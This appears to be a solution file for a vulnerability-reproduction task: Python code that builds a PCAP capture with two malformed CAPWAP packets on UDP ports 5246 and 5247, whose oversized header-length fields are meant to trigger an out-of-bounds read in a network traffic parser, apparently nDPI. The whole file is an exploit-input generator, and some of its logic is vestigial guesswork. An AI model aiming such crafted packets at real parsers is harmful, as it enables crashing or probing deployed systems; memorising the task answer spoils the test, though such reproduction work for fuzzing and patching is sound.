import struct
import tarfile
import os
from typing import Optional


def ip_checksum(h):
    s = 0
    n = len(h)
    i = 0
    while i + 1 < n:
        s += (h[i] << 8) + h[i + 1]
        i += 2
    if i < n:
        s += h[i] << 8
    s = (s & 0xffff) + (s >> 16)
    s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def build_ipv4_udp_packet(src_ip, dst_ip, src_port, dst_port, payload):
    # Ethernet header
    eth_dst = b'\x00\x11\x22\x33\x44\x55'
    eth_src = b'\x66\x77\x88\x99\xaa\xbb'
    eth_type = b'\x08\x00'  # IPv4
    eth = eth_dst + eth_src + eth_type

    # IP header
    version_ihl = 0x45
    dscp_ecn = 0
    total_length = 20 + 8 + len(payload)
    identification = 0
    flags_fragment = 0
    ttl = 64
    protocol = 17  # UDP
    checksum = 0
    ip_header = struct.pack("!BBHHHBBHII",
                            version_ihl, dscp_ecn, total_length,
                            identification, flags_fragment,
                            ttl, protocol, checksum,
                            src_ip, dst_ip)
    csum = ip_checksum(ip_header)
    ip_header = struct.pack("!BBHHHBBHII",
                            version_ihl, dscp_ecn, total_length,
                            identification, flags_fragment,
                            ttl, protocol, csum,
                            src_ip, dst_ip)

    # UDP header
    udp_len = 8 + len(payload)
    udp_checksum = 0  # set to 0 for simplicity
    udp_header = struct.pack("!HHHH", src_port, dst_port, udp_len, udp_checksum)

    return eth + ip_header + udp_header + payload


def build_pcap(packets):
    # PCAP global header (little endian)
    # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
    gh = struct.pack("<IHHiiii",
                     0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

    out = bytearray(gh)
    ts_sec = 0
    ts_usec = 0
    for pkt in packets:
        incl_len = len(pkt)
        orig_len = incl_len
        ph = struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len)
        out += ph
        out += pkt
        ts_sec += 1
    return bytes(out)


def build_capwap_overflow_payload() -> bytes:
    # Attempt to trigger CAPWAP parser with oversized header length.
    # Set HLEN to a large value using maxed bits in early bytes.
    # Use UDP destination ports 5246/5247 to select CAPWAP dissector.
    #
    # CAPWAP header is 8 bytes minimum; we fill with values that
    # imply a very large header length to cause overread in vulnerable versions.
    #
    # Construct two forms to increase chances:
    # - First packet: all-ones intro with explicit HLEN nibble of 0x1F (max 31 words)
    # - Second packet: full 0xFF header to maximize flags and length bits
    #
    # Follow header with small payload so that header length exceeds payload.
    header1 = bytearray(8)
    # Try to set HLEN to 31 words via common layouts: lower 5 bits of first two bytes.
    header1[0] = 0xFF  # high bits and lower nibble likely contributes to HLEN
    header1[1] = 0xFF
    header1[2] = 0xFF
    header1[3] = 0xFF
    header1[4] = 0x00
    header1[5] = 0x00
    header1[6] = 0x00
    header1[7] = 0x00
    tail1 = b'\x00' * 8  # insufficient data vs declared header length

    # Alternate header crafted to explicitly encode 0x1F in a plausible HLEN field
    header2 = bytearray(8)
    # Some implementations place HLEN in low 5 bits across first bytes; encode 0x1F
    header2[0] = 0x1F  # HLEN = 31 words (124 bytes)
    header2[1] = 0xFF  # maximize remaining bits/flags
    header2[2] = 0xAA
    header2[3] = 0x55
    header2[4] = 0x00
    header2[5] = 0x00
    header2[6] = 0x00
    header2[7] = 0x00
    tail2 = b'\x00' * 4  # even shorter extra data

    return bytes(header1 + tail1), bytes(header2 + tail2)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to detect if the harness appears to be PCAP-based; if we can read the tarball and
        # find fuzzer references to pcap/ndpiReader, we prefer PCAP. Otherwise, still return PCAP.
        use_pcap = True

        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))):
                            continue
                        if "fuzz" in name or "oss-fuzz" in name or "fuzzer" in name or "ndpireader" in name or "pcap" in name:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            try:
                                content = f.read(4096).lower()
                            except Exception:
                                continue
                            # Heuristic indicators for a PCAP-driven harness or ndpiReader
                            if b"pcap" in content or b"ndpireader" in content or b"dlten10mb" in content or b"libpcap" in content:
                                use_pcap = True
                                break
        except Exception:
            # On any failure, stick with PCAP
            use_pcap = True

        # Construct CAPWAP-overflow payloads
        capwap1, capwap2 = build_capwap_overflow_payload()

        # Build two UDP packets to common CAPWAP ports.
        src_ip = int.from_bytes(b'\x0a\x00\x00\x01', "big")  # 10.0.0.1
        dst_ip = int.from_bytes(b'\x0a\x00\x00\x02', "big")  # 10.0.0.2

        pkt1 = build_ipv4_udp_packet(src_ip, dst_ip, 40000, 5246, capwap1)
        pkt2 = build_ipv4_udp_packet(src_ip, dst_ip, 40001, 5247, capwap2)

        if use_pcap:
            poc = build_pcap([pkt1, pkt2])
        else:
            # Fallback: raw UDP-like framing (very unlikely used; still provide something)
            # Format: [proto=17][src_port(2)][dst_port(2)] + payload
            header1 = struct.pack("!BHH", 17, 40000, 5246)
            header2 = struct.pack("!BHH", 17, 40001, 5247)
            poc = header1 + capwap1 + header2 + capwap2

        return poc